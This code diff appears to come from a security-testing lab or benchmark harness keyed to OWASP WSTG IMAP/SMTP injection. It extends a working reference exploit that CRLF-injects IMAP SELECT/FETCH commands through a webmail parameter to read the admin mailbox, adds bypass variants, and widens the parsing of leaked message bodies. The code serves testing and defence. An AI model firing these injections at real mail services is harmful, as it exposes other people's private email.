@@ -106,7 +106,7 @@ function imapPort(canary, scenario) {
 export const classDef = {
   wstgId: 'WSTG-INPV-10',
   class: 'IMAP/SMTP Injection',
-  defenceTiers: [0],
+  defenceTiers: [0, 1],
   Scenario,
   needsSignup: false,
   canaryRuntime: true,
@@ -134,13 +134,17 @@ export const classDef = {
     }
   },
 
-  // Reference exploit: CRLF-inject a SELECT of the admin mailbox + FETCH.
-  async fireExploit({ baseUrl, scenario }) {
-    // Trailing NOOP keeps the admin FETCH (z2) a COMPLETE command so real
-    // dovecot returns it; the webmail front's appended " BODY[TEXT]" then lands
-    // harmlessly on the NOOP (a bare "FETCH .. BODY[TEXT] BODY[TEXT]" is a
-    // syntax error in strict IMAP servers).
-    const inj = `1 BODY[TEXT]\r\nz1 SELECT ${scenario.adminMailbox}\r\nz2 FETCH 1 BODY[TEXT]\r\nz3 NOOP`
+  // Reference exploit: CRLF-inject IMAP commands to open the admin mailbox and
+  // fetch its first message. The trailing NOOP keeps the admin FETCH (the
+  // second tagged command) a COMPLETE command so dovecot returns it; the
+  // webmail front's appended ` BODY[TEXT]` then lands harmlessly on the NOOP
+  // (a bare `FETCH .. BODY[TEXT] BODY[TEXT]` is a syntax error in strict IMAP
+  // servers). The `payload` argument is the messageParam value supplied by the
+  // validator — at T0 it is the canonical SELECT/FETCH chain; at T1 the
+  // validator cycles through bypass shapes that swap in EXAMINE plus
+  // alternative fetch attributes.
+  async fireExploit({ baseUrl, scenario, payload }) {
+    const inj = payload || `1 BODY[TEXT]\r\nz1 SELECT ${scenario.adminMailbox}\r\nz2 FETCH 1 BODY[TEXT]\r\nz3 NOOP`
     const url = `${baseUrl}${scenario.endpoint.path}?${encodeURIComponent(scenario.messageParam)}=${encodeURIComponent(inj)}`
     const r = await fetch(url, { redirect: 'manual' })
     return { status: r.status, body: await r.text() }
@@ -152,11 +156,13 @@ export const classDef = {
 
 export const __test = { getImap, imapViewMessage, extractBodies }
 
-// Pull the message bodies out of the raw IMAP response (between BODY[TEXT] {n}
-// and the closing paren), so injected FETCH output surfaces to the webmail view.
+// Pull the message bodies out of the raw IMAP response. dovecot frames the
+// payload as `<ATTR> {<len>}\r\n<bytes>)` for any of BODY[TEXT], BODY.PEEK[TEXT],
+// RFC822.TEXT, BODY[1] — all of which the bypass payloads exercise. The
+// pattern accepts whichever attribute the server chose to echo back.
 function extractBodies(resp) {
   const bodies = []
-  const re = /BODY\[TEXT\] \{(\d+)\}\r\n([\s\S]*?)\)\r\n/g
+  const re = /(?:BODY(?:\.PEEK)?\[(?:TEXT|\d+)\]|RFC822\.TEXT)\s*\{(\d+)\}\r\n([\s\S]*?)\)\r\n/g
   let m
   while ((m = re.exec(resp))) bodies.push(m[2])
   return bodies.length ? bodies.join('\n---\n') : '(no message content)'
